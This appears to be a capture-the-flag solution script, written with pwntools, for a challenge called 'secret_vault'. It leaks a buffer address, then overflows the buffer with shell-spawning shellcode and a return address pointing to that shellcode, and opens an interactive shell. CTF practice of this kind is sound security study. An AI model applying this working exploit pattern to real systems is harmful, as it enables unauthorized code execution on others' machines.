#!/usr/bin/python3

from pwn import *


elf = ELF("secret_vault")

context.arch = "amd64"

if args.REMOTE:
    r = remote("vault.challs.olicyber.it", 10006)
else:
    r = process("secret_vault")


def insert_secret(buf):
    r.sendlineafter(b">", b"1")
    r.sendlineafter(b"messaggio:", buf)
    r.recvuntil(b"in ")
    addr = int(r.recv(14), 16)
    return addr

def show_secret():
    r.sendlineafter(b">", b"2")
    r.recvuntil(b"Decriptazione in corso")
    return r.recvuntil(b"\nScegli cosa fare", drop=True).strip()

shell = asm(shellcraft.sh())

payload = shell
payload = payload.ljust(80, b"\x00")
payload += b"a"*8
payload += p64(insert_secret(b"aaaa"))
insert_secret(payload)

r.sendlineafter(b">", b"3")

r.interactive()